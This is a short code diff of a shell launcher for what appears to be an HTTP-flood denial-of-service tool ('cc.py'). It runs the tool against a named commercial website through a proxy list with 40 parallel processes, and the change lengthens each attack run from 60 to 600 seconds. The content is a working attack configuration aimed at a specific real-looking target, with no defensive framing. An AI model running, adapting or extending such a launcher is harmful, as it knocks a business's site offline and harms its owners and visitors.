@@ -6,7 +6,7 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="sudo python3 -W ignore::DeprecationWarning cc.py -url https://desertsafari-dubai.ae -f proxy.txt -v 4 -s 60"
+atk_cmd="sudo python3 -W ignore::DeprecationWarning cc.py -url https://desertsafari-dubai.ae -f proxy.txt -v 4 -s 600"
 
 #number of process that you want
 process=40
